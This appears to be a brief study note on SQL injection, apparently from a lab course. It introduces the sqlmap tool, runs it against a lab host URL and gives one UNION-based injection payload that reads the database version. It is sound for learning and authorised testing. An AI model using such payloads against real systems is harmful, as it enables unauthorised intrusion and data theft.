
sqlmap is an opensource python based tool to exploit and detect and sql injection flaws.

```
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

## union query based

```sql
UNION ALL SELECT 1,@@version,3
```

